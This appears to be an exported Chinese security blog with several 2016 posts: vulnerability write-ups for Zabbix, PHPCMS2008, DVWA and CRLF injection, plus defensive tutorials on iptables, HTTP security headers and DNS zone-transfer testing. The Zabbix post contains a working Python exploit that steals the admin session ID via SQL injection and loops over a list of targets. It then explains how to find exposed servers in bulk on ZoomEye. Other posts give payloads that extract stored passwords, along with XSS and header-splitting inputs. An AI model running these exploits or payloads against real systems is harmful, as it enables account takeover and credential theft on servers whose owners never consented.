1.png(后面的是convert的参数) 0x05 漏洞修复 升级到最新版本 配置/etc/ImageMagick/policy.xml的方式来禁止https、mvg这些delegate,或者直接在配置文件删除相应的delegate 1234567&lt;policymap&gt; &lt;policy domain=&quot;coder&quot; rights=&quot;none&quot; pattern=&quot;EPHEMERAL&quot; /&gt; &lt;policy domain=&quot;coder&quot; rights=&quot;none&quot; pattern=&quot;URL&quot; /&gt; &lt;policy domain=&quot;coder&quot; rights=&quot;none&quot; pattern=&quot;HTTPS&quot; /&gt; &lt;policy domain=&quot;coder&quot; rights=&quot;none&quot; pattern=&quot;MVG&quot; /&gt; &lt;policy domain=&quot;coder&quot; rights=&quot;none&quot; pattern=&quot;MSL&quot; /&gt;&lt;/policymap&gt;]]></content>
      <tags>
        <tag>渗透测试</tag>
        <tag>提权</tag>
        <tag>命令执行</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Zabbix SQL注入,绕过登陆]]></title>
    <url>%2F2016%2F09%2F23%2FZabbix-SQL%E6%B3%A8%E5%85%A5-%E7%BB%95%E8%BF%87%E7%99%BB%E9%99%86%2F</url>
    <content type="text"><![CDATA[0x00 漏洞概述Zabbix是一个开源的企业级性能监控解决方案。zabbix的jsrpc的profileIdx2参数存在insert方式的SQL注入漏洞，攻击者无需授权登陆即可登陆zabbix管理系统，也可通过script等功能轻易直接获取zabbix服务器的操作系统权限。 但是无需登录注入这里有个前提，就是zabbix开启了guest权限。而在zabbix中，guest的默认密码为空。需要有这个条件的支持才可以进行无权限注入。 0x01 影响程度攻击成本：低 危害程度：高 是否登陆：不需要 影响范围：2.2.x, 3.0.0-3.0.3。（摘自Freebuf） 0x02 漏洞测试在Zabbix中有两个文件存在SQL注入漏洞，分别是jsrpc.php和latest.php，存在漏洞参数分别为：profileIdx2和toggle_ids。 在目标的zabbix的地址后面加上如下POC： 123456/jsrpc.php?sid=0bcd4ade648214dc&amp;type=9&amp;method=screen.get&amp;timestamp=1471403798083&amp;mode=2&amp;screenid=&amp;groupid=&amp;hostid=0&amp;pageFile=history.php&amp;profileIdx=web.item.graph&amp;profileIdx2=2&apos;666&amp;updateProfile=true&amp;screenitemid=&amp;period=3600&amp;stime=20160817050632&amp;resourcetype=17&amp;itemids%5B23297%5D=23297&amp;action=showlatest&amp;filter=&amp;filter_task=&amp;mark_color=1 若返回页面出现You have an error in your SQL syntax则证明存在SQL注入漏洞。 漏洞EXP：123456789101112131415161718192021222324252627282930#!/usr/bin/python# -*- coding: UTF-8 -*-&apos;&apos;&apos;@Author：w2n1ck@博客：http://byd.dropsec.xyz/&apos;&apos;&apos;import urllib,sys,urllib2,urllibdef cookie(url): poc=&apos;/jsrpc.php?sid=0bcd4ade648214dc&amp;type=9&amp;method=screen.get&amp;timestamp=1471403798083&amp;mode=2&amp;screenid=&amp;groupid=&amp;hostid=0&amp;pageFile=history.php&amp;profileIdx=web.item.graph&amp;profileIdx2=(select 1 from (select count(*),concat(floor(rand(0)*2), (select sessionid from sessions where userid=1 and status=0 limit 1))x from information_schema.character_sets group by x)y)&amp;updateProfile=true&amp;screenitemid=&amp;period=3600&amp;stime=20160817050632&amp;resourcetype=17&amp;itemids%5B23297%5D=23297&amp;action=showlatest&amp;filter=&amp;filter_task=&amp;mark_color=&apos; body= urllib.urlopen(url+poc).read() cookie=body.split(&apos;Duplicate entry&apos;)[1].split(&apos;for key&apos;)[0][3:-2] return cookiedef test(cookie,url): url=url+&apos;proxies.php&apos; req=urllib2.Request(url) cook=&quot;zbx_sessionid=%s&quot; % cookie req.add_header(&apos;Cookie&apos;, cook) response=urllib2.urlopen(req) data=response.read() if data.find(&apos;Access denied.&apos;) &lt; 0: print &quot;OK--&gt;&quot;,cookie else: print &apos;ERROR&apos;if len(sys.argv)==4: for i in open(sys.argv[3]).readlines(): print i test(cookie(i),i)else: print sys.argv[1] test(cookie(sys.argv[1]),sys.argv[1]) 设计步骤：首先查询的sql语句为：select 1 from (select count(*),concat(floor(rand(0)*2), (select sessionid from sessions where userid=1 and status=0 limit 1))x from information_schema.character_sets group by x)y 查询的sessionid会在页面中显示 然后通过body.split(&#39;Duplicate entry&#39;)[1].split(&#39;for key&#39;)[0][3:-2]来取出sessionid的值,具体的可以看响应的页面结构 然后带入cookie访问proxies.php，如果没有出现Access denied. 则说明进入成功，输出sessionid的值 参考:独自等待博客EXP 0x03 漏洞修复1、禁用后台用户guest账号（注入要求此账号启用）。 2、升级到zabbix的最新版。 0x04 批量查找上Zoomeye，输入查询关键字:Zabbix port:80，当然，如果你想定点查询的话还可以加上country: City:等字段，比如查询北京Zabbix country:china port:80 city:Beijing;]]></content>
      <tags>
        <tag>渗透测试</tag>
        <tag>编程</tag>
        <tag>自动化</tag>
        <tag>SQL注入</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PHPCMS2008广告模板SQL注入漏洞]]></title>
    <url>%2F2016%2F09%2F22%2FPHPCMS2008%E5%B9%BF%E5%91%8A%E6%A8%A1%E6%9D%BFSQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%2F</url>
    <content type="text"><![CDATA[0x00 漏洞描述PHPCMS2008由于广告模块取referer不严，导致一处sql注入漏洞.可以得到管理员用户名与密码，攻击者登录后台后可能会获取webshell，对服务器进行进一步的渗透。 0x01 漏洞分析漏洞产生的位置：/ads/include/ads_place.class.php的show方法中. 123456789101112function show($placeid) ... if($adses[0][&apos;option&apos;]) &#123; foreach($adses as $ads) &#123; $contents[] = ads_content($ads, 1); $this-&gt;db-&gt;query(“INSERT INTO$this-&gt;stat_table(`adsid`,`username`,`ip`,`referer`,`clicktime`,`type`)VALUES (‘$ads[adsid]’,’$_username’,’$ip’,‘$this-&gt;referrer’,‘$time’,,’0’)”); $template = $ads[&apos;template&apos;] ? $ads[&apos;template&apos;] : &apos;ads&apos;; &#125; &#125; ... sql语句中 1$this-&gt;db-&gt;query(“INSERT INTO$this-&gt;stat_table(`adsid`,`username`,`ip`,`referer`,`clicktime`,`type`)VALUES (‘$ads[adsid]’,’$_username’,’$ip’,‘$this-&gt;referrer’,‘$time’,,’0’)”); 这里$this-&gt;referrer通过this方法直接将HTTP请求头中的referer字段插入到数据库中,没有做任何过滤措施。(这个this方法是PHPCMS里面直接封装的)。 所以现在已经找到漏洞点，下一步就是找包含漏洞的用户可控的页面。如果漏洞是用户不可控的，比如只能管理员利用，那就相当的鸡肋了。 这里使用回溯的方法，看看哪些页面调用了它。 页面/ads/include/commom.inc.php 123456&lt;?php ...require MOD_ROOT.&apos;include/ads_place.class.php&apos;;require MOD_ROOT.&apos;include/ads.class.php&apos;;...?&gt; 在往上看看谁调用了/ads/include/commom.inc.php /ads/ad.php文件中 12345&lt;?php...require &apos;./include/common.inc.php&apos;;...?&gt; ad.php文件为用户可控文件，但ad.php有时不能访问，继续向上查找/data/js.php 1234&lt;?phpchdir(‘../ads/’);require ‘./ad.php’;?&gt; 在用户访问首页时，会调用js.php，通过该文件可以提交有害字段，然后通过逐层调用，传入字段referer到危险方法show，引入SQL注入攻击。 0x02 漏洞利用修改请求头中的referer字段的话有很多种，比如burpsuite，Tamper Data… 这里直接使用火狐的Tamper Data进行修改： 点击Start Tamper,然后访问http://your-addr/data/js.php?id=1 这时候Tamper Data会跳出来,在右边框内，点击右键，添加一个element值填写payload referer=1’, (SELECT 1 FROM (select count(*), concat(floor(rand(0)*2),char(45,45,45),(SELECT password from phpcms_member limit 1))a from information_schema.tables group by a)b), ‘0’)# 这里我解释一下：因为漏洞的sql语句是INSERT是不回显的，所以可以使用盲注，这里的payload使用的floor报错注入。floor报错注入原理请参考：floor函数用法 把这个payload带入sql语句中是： 1$this-&gt;db-&gt;query(“INSERT INTO$this-&gt;stat_table(`adsid`,`username`,`ip`,`referer`,`clicktime`,`type`)VALUES (‘$ads[adsid]’,’$_username’,’$ip’,‘1’,‘$time’,(SELECT 1 FROM (select count(*), concat(floor(rand(0)*2),char(45,45,45),(SELECT password from phpcms_member limit 1))a from information_schema.tables group by a)b), ‘0’)#,’0’)”); 0x03 漏洞修复对相关字段进行过滤处理。 123$referer = safe_replace($this-&gt;referer); $this-&gt;db-&gt;query(&quot;INSERT INTO $this-&gt;stat_table (`adsid`, `username`, `ip`, `referer`, `clicktime`, `type`) VALUES (&apos;$ads[adsid]&apos;, &apos;$_username&apos;, &apos;$ip&apos;, &apos;$referer&apos;, &apos;$time&apos;, &apos;0&apos;)&quot;);$template = $ads[&apos;template&apos;] ? $ads[&apos;template&apos;] : &apos;ads&apos;; 这里safe_replace是PHPCMS2008封装的过滤函数。]]></content>
      <tags>
        <tag>渗透测试</tag>
        <tag>SQL注入</tag>
        <tag>代码审计</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python实现批量网站存活检测]]></title>
    <url>%2F2016%2F09%2F21%2FPython%E5%AE%9E%E7%8E%B0%E6%89%B9%E9%87%8F%E7%BD%91%E7%AB%99%E5%AD%98%E6%B4%BB%E6%A3%80%E6%B5%8B%2F</url>
    <content type="text"><![CDATA[做渗透测试的时候，有个比较大的项目，里面有几百个网站，这样你必须首先确定哪些网站是正常，哪些网站是不正常的。所以自己就编了一个小脚本，为以后方便使用。 具体实现的代码如下： 12345678910111213141516171819202122232425262728#!/usr/bin/python# -*- coding: UTF-8 -*-&apos;&apos;&apos;@Author：w2n1ck@博客：http://byd.dropsec.xyz/&apos;&apos;&apos;import requestsimport sysf = open(&apos;url.txt&apos;, &apos;r&apos;)url = f.readlines()length = len(url)url_result_success=[]url_result_failed=[]for i in range(0,length): try: response = requests.get(url[i].strip(), verify=False, allow_redirects=True, timeout=5) if response.status_code != 200: raise requests.RequestException(u&quot;Status code error: &#123;&#125;&quot;.format(response.status_code)) except requests.RequestException as e: url_result_failed.append(url[i]) continue url_result_success.append(url[i])f.close()result_len = len(url_result_success)for i in range(0,result_len): print &apos;网址%s&apos; % url_result_success[i].strip()+&apos;打开成功&apos; 测试结果如下： 遇到的问题： 刚开始测试的时候，遇到只要是不能错误，或者不存在的，直接报错停止程序。后来发现是因为response.status_code != 200这里取状态码的时候错误。 因为有的网站不能打开的话，不会返回状态码。所以程序就不知道！==200怎么处理了。 解决方法： 使用try except else捕捉异常 具体代码为： 1234567try: response = requests.get(url[i].strip(), verify=False, allow_redirects=True, timeout=5) if response.status_code != 200: raise requests.RequestException(u&quot;Status code error: &#123;&#125;&quot;.format(response.status_code)) except requests.RequestException as e: url_result_failed.append(url[i]) continue]]></content>
      <tags>
        <tag>渗透测试</tag>
        <tag>编程</tag>
        <tag>Python</tag>
        <tag>自动化</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[DNS域传送漏洞]]></title>
    <url>%2F2016%2F09%2F20%2FDNS%E5%9F%9F%E4%BC%A0%E9%80%81%E6%BC%8F%E6%B4%9E%2F</url>
    <content type="text"><![CDATA[DNS是网络中应用非常广泛的服务之一，是一种底层的网络基础服务。它的主要作用是提供域名（如baidu.com）和IP直接解析关系的功能，只要我们的网络通信中存在域名，就会涉及到DNS服务。DNS区域传送（DNS zone transfer）指的是一台备用服务器使用来自主服务器的数据刷新自己的域（zone）数据库。这为运行中的DNS服务提供了一定的冗余度，其目的是为了防止主的域名服务器因意外故障变得不可用时影响到整个域名的解析。一般来说，DNS区域传送操作只在网络里真的有备用域名DNS服务器时才有必要用到，但许多DNS服务器却被错误地配置成只要有client发出请求，就会向对方提供一个zone数据库的详细信息，所以说允许不受信任的因特网用户执行DNS区域传送（zone transfer）操作是后果最为严重的错误配置之一。 简单点说就是DNS服务器配置不当，导致可以将该DNS服务器上的数据传送到其他的主机上。恶意攻击者可以通过此种方法，获取某个域名的所有子域名及对应IP地址。 测试方法1、Linux dig测试方法dig是Linux上常用的dns工具，如果没有此命令，可以使用如下命令安装（Centos系统）： yum install bind-utils 使用dig进行DNS域传送，首先要找到主机的SOA或者NS记录： 12345678910111213141516171819[root@user ~]# dig soa xxx.com ; &lt;&lt;&gt;&gt; DiG 9.8.2rc1-RedHat-9.8.2-0.23.rc1.el6_5.1 &lt;&lt;&gt;&gt; soa 3mc2.com;; global options: +cmd;; Got answer:;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 2865;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 0 ;; QUESTION SECTION:;3mc2.com. IN SOA ;; ANSWER SECTION:xxx.com. 600 IN SOA f1g1ns1.dnspod.net. freednsadmin.dnspod.com. 1411491105 3600 180 1209600 180 ;; Query time: 504 msec;; SERVER: 223.5.5.5#53(223.5.5.5);; WHEN: Wed Mar 11 11:26:05 2015;; MSG SIZE rcvd: 100 显示结果忽略注释部分，我们可以看到SOA记录有两个服务器：f1g1ns1.dnspod.net 和 freednsadmin.dnspod.com，然后我们就可以通过如下命令查看DNS是否存在DNS域传送漏洞，如果存在，则可以找到xxx.com的所有子域名和IP对应关系： 12345[root@user ~]# dig axfr xxx.com @f1g1ns1.dnspod.net ; &lt;&lt;&gt;&gt; DiG 9.8.2rc1-RedHat-9.8.2-0.23.rc1.el6_5.1 &lt;&lt;&gt;&gt; axfr xxx.com @f1g1ns1.dnspod.net;; global options: +cmd; Transfer failed. 以上是不能进行DNS域传送的结果，下图是可以进行DNS域传送的结果： 2、Windows nslookup命令nslookup是windows下自带的DNS测试工具，可以通过此命令进行DNS域传送测试： 主要方法和dig类似，先找出ns服务器，然后执行ls -d 列出子域等信息（以下是不能传送的情形）： 123456789101112131415161718192021222324[c:\~]$ nslookup默认服务器: public1.alidns.comAddress: 223.5.5.5 &gt; set type=ns&gt; xxx.com非权威应答:服务器: public1.alidns.comAddress: 223.5.5.5 xxx.com nameserver = f1g1ns1.dnspod.netxxx.com nameserver = f1g1ns2.dnspod.net&gt; server f1g1ns2.dnspod.net默认服务器: f1g1ns2.dnspod.netAddresses: 115.236.137.40 112.90.82.194 101.226.30.224 182.140.167.188&gt; set type=any&gt; ls -d 3mc2.com*** 无法列出域 xxx.com: BAD ERROR VALUEDNS 服务器拒绝将区域 3mc2.com 传送到您的计算机。如果这不正确，请检查 IP 地址 223.5.5.5 的 DNS 服务器上 3mc2.com 的区域传送安全设置。 正常存在DNS域传送漏洞的返回结果如下所示： 3、使用dnsenum.pl和Dnswalk测试：现成工具，不做介绍，Kali里边有]]></content>
      <tags>
        <tag>渗透测试</tag>
        <tag>信息收集</tag>
        <tag>DNS域传送</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[IPtables入门教程]]></title>
    <url>%2F2016%2F09%2F03%2FIPtables%E5%85%A5%E9%97%A8%E6%95%99%E7%A8%8B%2F</url>
    <content type="text"><![CDATA[0x00 iptables介绍防火墙，其实说白了讲，就是用于实现Linux下访问控制的功能的，它分为硬件的或者软件的防火墙两种。无论是在哪个网络中，防火墙工作的地方一定是在网络的边缘。而我们的任务就是需要去定义到底防火墙如何工作，这就是防火墙的策略，规则，以达到让它对出入网络的IP、数据进行检测。 linux的包过滤功能，即linux防火墙，它由netfilter 和 iptables 两个组件组成。 netfilter 组件也称为内核空间，是内核的一部分，由一些信息包过滤表组成，这些表包含内核用来控制信息包过滤处理的规则集。 iptables 组件是一种工具，也称为用户空间，它使插入、修改和除去信息包过滤表中的规则变得容易。 0x01 iptables的结构iptables的结构： iptables -&gt; Tables -&gt; Chains -&gt; Rules简单地讲，tables由chains组成，而chains又由rules组成。iptables 默认有四个表Filter, NAT, Mangle, Raw，其对于的链如下图 0x02 filter表详解1. 在iptables中，filter表起过滤数据包的功能，它具有以下三种内建链： INPUT链 – 处理来自外部的数据。 OUTPUT链 – 处理向外发送的数据。 FORWARD链 – 将数据转发到本机的其他网卡设备上。 2. 数据流向场景 访问本机：在INPUT链上做过滤 本机访问外部：在OUTPUT链上做过滤 通过本机访问其他主机:在FORWARD链上做过滤 3. Iptables基本操作 启动iptables：service iptables start 关闭iptables：service iptables stop 重启iptables：service iptables restart 查看iptables状态：service iptables status 保存iptables配置：service iptables save Iptables服务配置文件：/etc/sysconfig/iptables-config Iptables规则保存文件：/etc/sysconfig/iptables 打开iptables转发：echo “1”&gt; /proc/sys/net/ipv4/ip_forward 0x03 iptables命令参考命令： iptables [ -t 表名] 命令选项 [链名] [条件匹配] [-j 目标动作或跳转] 1. 表名 表名：Filter, NAT, Mangle, Raw 起包过滤功能的为表Filter，可以不填，不填默认为Filter 2. 命令选项 选项名 功能及特点 -A 在指定链的末尾添加（–append）一条新的规则 -D 删除（–delete）指定链中的某一条规则，按规则序号或内容确定要删除的规则 -I 在指定链中插入（–insert）一条新的规则，默认在链的开头插入 -R 修改、替换（–replace）指定链中的一条规则，按规则序号或内容确定 -L 列出（–list）指定链中的所有的规则进行查看，默认列出表中所有链的内容 -F 清空（–flush）指定链中的所有规则，默认清空表中所有链的内容 -N 新建（–new-chain）一条用户自己定义的规则链 -X 删除指定表中用户自定义的规则链（–delete-chain） -P 设置指定链的默认策略（–policy） -n 用数字形式（–numeric）显示输出结果，若显示主机的 IP地址而不是主机名 -P 设置指定链的默认策略（–policy） -v 查看规则列表时显示详细（–verbose）的信息 -V 查看iptables命令工具的版本（–Version）信息 -h 查看命令帮助信息（–help） –line-number 查看规则列表时，同时显示规则在链中的顺序号 3. 链名 可以根据数据流向来确定具体使用哪个链，在Filter中的使用情况如下： INPUT链 – 处理来自外部的数据。 OUTPUT链 – 处理向外发送的数据。 FORWARD链 – 将数据转发到本机的其他网卡设备上。 4. 条件匹配 条件匹配分为基本匹配和扩展匹配，扩展匹配又分为隐式扩展和显示扩展。 a)基本匹配包括： 匹配参数 说明 -p 指定规则协议，如tcp, udp,icmp等，可以使用all来指定所有协议 -s 指定数据包的源地址参数，可以使IP地址、网络地址、主机名 -d 指定目的地址 -i 输入接口 -o 输出接口 b)隐式扩展包括： c)常用显式扩展 5. 目标值 数据包控制方式包括四种为： ACCEPT：允许数据包通过。 DROP：直接丢弃数据包，不给出任何回应信息。 REJECT：拒绝数据包通过，必须时会给数据发送端一个响应信息。 LOG：在/var/log/messages 文件中记录日志信息，然后将数据包传递给下一条规则。 QUEUE：防火墙将数据包移交到用户空间 RETURN：防火墙停止执行当前链中的后续Rules，并返回到调用链(the calling chain) 0x04 Iptables常见命令 删除iptables现有规则 iptables –F 查看iptables规则 iptables –L（iptables –L –v -n） 增加一条规则到最后 iptables -A INPUT -i eth0 -p tcp –dport 80 -m state –state NEW,ESTABLISHED -j ACCEPT 添加一条规则到指定位置 iptables -I INPUT 2 -i eth0 -p tcp –dport 80 -m state –state NEW,ESTABLISHED -j ACCEPT 删除一条规则 iptabels -D INPUT 2 修改一条规则 iptables -R INPUT 3 -i eth0 -p tcp –dport 80 -m state –state NEW,ESTABLISHED -j ACCEPT 设置默认策略 iptables -P INPUT DROP 允许远程主机进行SSH连接 iptables -A INPUT -i eth0 -p tcp –dport 22 -m state –state NEW,ESTABLISHED -j ACCEPT iptables -A OUTPUT -o eth0 -p tcp –sport 22 -m state –state ESTABLISHED -j ACCEPT 允许本地主机进行SSH连接 iptables -A OUTPUT -o eth0 -p tcp –dport 22 -m state –state NEW,ESTABLISHED -j ACCEPT iptables -A INTPUT -i eth0 -p tcp –sport 22 -m state –state ESTABLISHED -j ACCEPT 允许HTTP请求 iptables -A INPUT -i eth0 -p tcp –dport 80 -m state –state NEW,ESTABLISHED -j ACCEPT iptables -A OUTPUT -o eth0 -p tcp –sport 80 -m state –state ESTABLISHED -j ACCEPT 限制ping 192.168.146.3主机的数据包数，平均2/s个，最多不能超过3个 iptables -A INPUT -i eth0 -d 192.168.146.3 -p icmp –icmp-type 8 -m limit –limit 2/second –limit-burst 3 -j ACCEPT 限制SSH连接速率(默认策略是DROP) iptables -I INPUT 1 -p tcp –dport 22 -d 192.168.146.3 -m state –state ESTABLISHED -j ACCEPT iptables -I INPUT 2 -p tcp –dport 22 -d 192.168.146.3 -m limit –limit 2/minute –limit-burst 2 -m state –state NEW -j ACCEPT 0x05 使用iptables抵抗常见攻击1.防止syn攻击 思路一：限制syn的请求速度（这个方式需要调节一个合理的速度值，不然会影响正常用户的请求） iptables -N syn-flood iptables -A INPUT -p tcp --syn -j syn-flood iptables -A syn-flood -m limit --limit 1/s --limit-burst 4 -j RETURN iptables -A syn-flood -j DROP 思路二：限制单个ip的最大syn连接数 iptables –A INPUT –i eth0 –p tcp --syn -m connlimit --connlimit-above 15 -j DROP 2. 防止DOS攻击 利用recent模块抵御DOS攻击 iptables -I INPUT -p tcp -dport 22 -m connlimit --connlimit-above 3 -j DROP 单个IP最多连接3个会话 iptables -I INPUT -p tcp --dport 22 -m state --state NEW -m recent --set --name SSH 只要是新的连接请求，就把它加入到SSH列表中 Iptables -I INPUT -p tcp --dport 22 -m state NEW -m recent --update --seconds 300 --hitcount 3 --name SSH -j DROP 5分钟内你的尝试次数达到3次，就拒绝提供SSH列表中的这个IP服务。被限制5分钟后即可恢复访问。 3. 防止单个ip访问量过大 iptables -I INPUT -p tcp --dport 80 -m connlimit --connlimit-above 30 -j DROP 4. 木马反弹 iptables –A OUTPUT –m state --state NEW –j DROP 5. 防止ping攻击 iptables -A INPUT -p icmp --icmp-type echo-request -m limit --limit 1/m -j ACCEPT 参考资料：乌云-iptables基础知识]]></content>
      <tags>
        <tag>运维</tag>
        <tag>iptables</tag>
        <tag>linux</tag>
        <tag>应急响应</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[HTTP header 安全配置]]></title>
    <url>%2F2016%2F09%2F02%2Fheader%E5%AE%89%E5%85%A8%E9%85%8D%E7%BD%AE%2F</url>
    <content type="text"><![CDATA[现代浏览器提供了一些安全相关的响应头，使用这些响应头一般只需要修改服务器配置即可，不需要修改程序代码，成本很低。 安全方面的 HTTP Header 防御 XSS (Cross Site Scripting)： Content-Security-Policy Set-Cookie: HttpOnly X-XSS-Protection X-Download-Options Nginx在nginx.conf的server段中加入： add_header X-XSS-Protection “1; mode=block”; 在Nginx.conf的server段加入： add_header Content-Security-Policy: script-src &#039;self&#039; https://apis.google.com 防御 Clickjacking： X-Frame-Options add_header X-Frame-Options: DENY Nginx中编辑nginx.conf ，在server段加入： add_header X-Frame-Options “SAMEORIGIN”; 强化 HTTPS机制： Set-Cookie: Secure Strict-Transport-Security 在Nginx.conf的server段加入： add_header Strict-Transport-Security “max-age=31536000; includeSubdomains;”; 避免浏览器误判文件形式： X-Content-Type-Options 在Nginx.conf的server段加入： add_header X-Content-Type-Options nosniff; 保证网站资源被任意存取： Access-Control-Allow-Origin（此 header 若設定錯誤會適得其反！） X-Permitted-Cross-Domain-Policies add_header ccess-Control-Allow-Origin: http://foo.exampleAccess-Control-Allow-Origin: * Cookie保护 HttpOnly，会阻止XSS攻击将你的用户cookie发给黑客 Secure,属性能让Cookie通过HTTPS连接，而不是HTTP，这样，能够访问你的网络的黑客无法读取未加密的Cookie。 add_header Set-Cookie: HttpOnly add_header Set-Cookie: Secure]]></content>
      <tags>
        <tag>渗透测试</tag>
        <tag>XSS</tag>
        <tag>安全开发</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[从DVWA中学习PHP常见漏洞及防御]]></title>
    <url>%2F2016%2F09%2F01%2F%E4%BB%8EDVWA%E4%B8%AD%E5%AD%A6%E4%B9%A0PHP%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E5%8F%8A%E9%98%B2%E5%BE%A1%2F</url>
    <content type="text"><![CDATA[0x00 前言“安全是一个整体，保证安全不在于强大的地方有多强大 而在于真正薄弱的地方在哪里”–剑心 漏洞形成的原因就是接受了不安全的变量输入，又没得到有效的过滤，最后进入一些对敏感的函数就会对安全造成威胁。比如出现在mysql_query()函数可能就会造成SQL注入漏洞，出现在eval()以及preg_replace()中可能导致代码的执行。 主要介绍DVWA上的漏洞及修复方案：DVWA下载地址 0x01 SQL注入漏洞low的级别下$id变量没有经过任何的过滤，直接传入了sql语句，造成字符型注入 POC: ‘ union select user,password from users# SQL语句为： SELECT first_name, last_name FROM users WHERE user_id = ‘’ union select user,password from users# medium级别下虽然$id经过了mysql_real_escape_string转义了’，可是因为后面的SQL语句$id没有单引号保护，会被系统认为是数值型，导致数值型注入 POC: 1 union select user,password from users SQL语句为： SELECT first_name, last_name FROM users WHERE user_id = 1 union select user,password from users SQL注入修补方法 字符型注入漏洞修补方法： PHP5.3之前版本在php.ini中设置magic_quotes_gpc=On; magic_quotes_quotes_gpc会对传入的$_POST,$_GET,$_SERVER里的 ‘,”,\进行转义。 但是PHP5.4之后，magic_quotes_quotes_gpc就被废除了。 还要使用mysql_real_escape_string()或addslashes()对传入参数进行过滤，或者使用str_replace()对一些关键词进行替换。 但是addslashes()和mysql_real_escape_string()在数据库字符集设为GBK时是可能被绕过的。 如果数据库字符集是GBK的情况下，可以把 $mysqli-&gt;query(&apos;SET NAMES gbk&apos;); 修改为： $mysqli-&gt;set_charset(&apos;gbk&apos;); 数值型注入： 数值型注入比较好修补，只需要判断传入的变量是否为数值型就可以了(或者强行改成数值型mysql_numrows) 0x02 XSS漏洞黑客往Web页面里插入恶意html代码，当用户浏览该页之时，嵌入其中Web里面的html代码会被执行，从而达到黑客的特殊目的，比如窃取用户cookies.或者进行其他操作。 low级别下$message,$name两个变量从$_POST传入,只是经过一些特殊字符的转换。并没有对尖括号进行转义,所以还是造成了XSS的产生。 POC: &lt;script&gt;alert(1)&lt;script&gt; medium级别下，虽然对$message进行了尖括号转义，而且对&lt;script&gt;进行了替换，但是$name没有进行转义，而且跨站脚本可以用多种标签，如&lt;img /&gt;,等…。Name的&lt;input /&gt;限制了maxlength=‘10’的长度，但是我们的防御对象是精通技术的黑客。这种html下的长度限制是可以直接通过浏览器修改..然后通过大小写成功绕过str_replace()，插入XSS. POC: &lt;SCript&gt;alert(1)&lt;/SCript&gt; XSS修复方法 在将不可信数据插入到HTML标签之间时，对这些数据进行HTML Entity编码 在将不可信数据插入到HTML属性里时，对这些数据进行HTML属性编码 在将不可信数据插入到SCRIPT里时，对这些数据进行SCRIPT编码 在将不可信数据插入到Style属性里时，对这些数据进行CSS编码 在将不可信数据插入到HTML URL里时，对这些数据进行URL编码 使用富文本时，使用XSS规则引擎进行编码过滤 其实使用htmlspecialchars()在输出时对输出内容进行转义。在输出时进行转义比输入时进行转义效果更好，因为可以确保数据在入库时是完整的….不然丢失数据。 0x03 任意命令执行漏洞参考文章：命令执行漏洞总结 0x04 暴力破解加个google验证码，保证没有程序能识别出来… 0x05 文件包含漏洞参考文章：文件包含漏洞总结]]></content>
      <tags>
        <tag>爆破</tag>
        <tag>渗透测试</tag>
        <tag>XSS</tag>
        <tag>编程</tag>
        <tag>PHP</tag>
        <tag>命令执行</tag>
        <tag>SQL注入</tag>
        <tag>安全开发</tag>
        <tag>DVWA</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CRLF漏洞]]></title>
    <url>%2F2016%2F08%2F31%2FCRLF-injection%E6%BC%8F%E6%B4%9E%2F</url>
    <content type="text"><![CDATA[0x00 简介在文本处理中, CR, LF, CR/LF是不同操作系统上使用的换行符.Dos和windows采用回车+换行CR/LF表示下一行,而UNIX/Linux采用换行符LF表示下一行，苹果机(MAC OS系统)则采用回车符CR表示下一行.CR用符号’r’表示, 十进制ASCII代码是13, 十六进制代码为0x0D; LF使用’n’符号表示, ASCII代码是10, 十六制为0x0A.所以Windows平台上换行在文本文件中是使用 0d 0a 两个字节表示, 而UNIX和苹果平台上换行则是使用0a或0d一个字节表示. 0x01 原理我们都知道，HTTP协议是依靠两个CRLF，即\r\n来分割HTTP头部及响应体。基于这个认知，可以推出，HRS问题是由于服务端程序没有过滤掉头部中的特殊字符%0D%0A，直接输出到了返回的数据中，导致错误的解析。而在日常开发中，最常见的莫过于有以下的两种功能（1）URL跳转（2）Cookie的设置中出现。 一旦我们能够控制http头，通过注入一些CRLF这样就可以控制header和body的分割线，这样我们就可以向body或是header中注入些东西了。所以CRLF Injection又叫HTTP Response Splitting，简称HRS。 0x02 危害如果目标网页存在响应头部CRLF注入，在HTTP响应头注入回车换行符，就可以注入头部：X-XSS-Protection: 0 HTTP header的定义就是基于这样的&quot;Key: Value&quot;的结构，用CRLF命令表示一行的结尾。 &quot;Location:&quot;头用来表示重定向的URL地址， &quot;Set-Cookie:&quot;头用来设置cookies。 如果用户的输入经过验证，其中存在CRLF的字符就可以被用来达到欺骗的目的。 0x03 实例测试代码：index.php &lt;?php /* *@博客：http://byd.dropsec.xyz/ *@Author：w2n1ck */ echo &apos;&lt;pre&gt;&apos;; print_r(file(&quot;http://www.site1.com/api?test=$test&quot;/images/test.png)); echo &apos;&lt;/pre&gt;&apos;; ?&gt; 如果攻击者这样发送： index.php?test=test%20HTTP /1.0%0D%0AHost%3A%20www.site2.com%0D%0AUser-Agent%3A%20joy_nick/0.0%0D%0AReferer%3A%20http%3A%2F%2Fwww.test.org%2F%0D%0ACookie%3A%20user%3Djoy_nick%0D%0A%0D%0AHTTP/1.0%0D%0AHost%3A%20http%3A%2F%2Fwww.SITE1.com%0D%0AUser-Agent%3A%20PHP/4.1.2 (必须在一行上) 这个 HTTP 请求将被发送给 www.site1.com: GET /api?test=test HTTP/1.0 Host: www.site2.com User-Agent: joy_nick/0.0 Referer: http://www.test.org/ Cookie: user=joy_nick HTTP/1.0 Host: www.site1.st User-Agent: PHP/4.1.2 你可以看到，真实的PHP头信息被正确发送，但被服务器忽略了，因为在它们指向的报头结束之前我们发送两个CRLF。 利用此缺陷，攻击者能够任意添加用户代理（user-agent），referers 和 cookies。如果站点1和站点2是同一台服务器上的虚拟主机，即使index.php有限制，攻击者也能绕过其限制非法访问站点2。 还有一个xss的能够轻松绕过filter的XSS，如果我们输入： http://www.xxx.com%0d%0a%0d%0a%3Csvg%2fonload%3dprompt%281%29%3E HTTP/1.1 